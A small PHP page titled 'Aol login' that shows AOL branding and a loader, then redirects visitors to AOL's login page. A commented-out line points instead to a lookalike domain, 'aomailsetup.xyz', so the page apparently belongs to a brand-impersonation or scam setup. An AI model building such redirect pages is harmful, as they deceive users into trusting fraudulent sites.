 <?php
 $iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
 $android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
 $palmpre = strpos($_SERVER['HTTP_USER_AGENT'],"webOS");
 $berry = strpos($_SERVER['HTTP_USER_AGENT'],"BlackBerry");
 $ipod = strpos($_SERVER['HTTP_USER_AGENT'],"iPod");

 if ($iphone || $android || $palmpre || $ipod || $berry == true) 
 {
     header("Location:https://login.aol.com/");

  }
  else{
       //echo "<meta http-equiv='refresh' content='2;url=https://aomailsetup.xyz/a-o-log-in/'
      echo "<meta http-equiv='refresh' content='2;url=https://login.aol.com/' />";
      
    // header("Location:https://login.aol.com/");
  }
 ?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="robots" content="noindex nofollow" />
  
 <!--<meta http-equiv="refresh" content="2;url=https://google.com/" />-->
 
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Aol login</title>
	
	<style>
		.logo-div
		{text-align: center; margin: 18% 0;}
		.logo-img{padding:5px 0;}
		.logo-img img
		{width:90px; margin:auto; display: block;}
		
		@media only screen and (max-width:480px)
		{
			.logo-div
			{margin:50% 0;}
		}
	</style>
</head>

<body>
    



	<div class="logo-div">
		<div class="logo-img"><img src="images/aol-logo.png"></div>
		<div class="loader-img"><img src="images/loader.gif"></div>
	</div>
</body>
</html>

